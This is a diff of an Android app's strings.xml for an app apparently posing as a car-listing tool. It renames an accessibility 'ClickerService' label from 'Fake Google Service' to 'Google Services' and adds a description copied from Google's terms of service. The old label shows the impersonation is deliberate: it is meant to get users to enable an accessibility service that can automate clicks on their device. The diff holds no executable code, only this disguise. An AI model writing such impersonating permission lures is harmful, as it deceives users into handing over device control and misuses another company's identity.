@@ -1,6 +1,23 @@
 <resources>
     <string name="app_name">AnakinSkywalker</string>
-    <string name="accessibilityservice_id">/com.andrei.host.ClickerService</string>
-    <string name="accessibility_service_label">Fake Google Service</string>
-    <string name="accessibilityservice_warning">Install Service On</string>
+
+    <!--Accessibility Service-->
+    <string name="accessibility_service_id">/com.andrei.host.ClickerService</string>
+    <string name="accessibility_service_label">Google Services</string>
+    <string name="accessibility_service_warning">Install Service On</string>
+    <string name="accessibility_service_description">Welcome to Google!\n
+    Thanks for using our products and services (“Services”). The Services are provided by Google LLC (“Google”), located at 1600 Amphitheatre Parkway, Mountain View, CA 94043, United States.\n\n
+    By using our Services, you are agreeing to these terms. Please read them carefully.\n\n
+    Our Services are very diverse, so sometimes additional terms or product requirements (including age requirements) may apply. Additional terms will be available with the relevant Services and those additional terms become part of your agreement with us if you use those Services.</string>
+
+    <!--Car Screen-->
+    <string name="title_activity_car_list">Cars</string>
+    <string name="title_activity_car_details">Details</string>
+
+    <!--Details Screen-->
+    <string name="call_btn_text">call</string>
+    <string name="message_btn_text">Message</string>
+    <string name="offer_btn_text">make your offer</string>
+    <string name="cars_layout">List Layout</string>
+
 </resources>
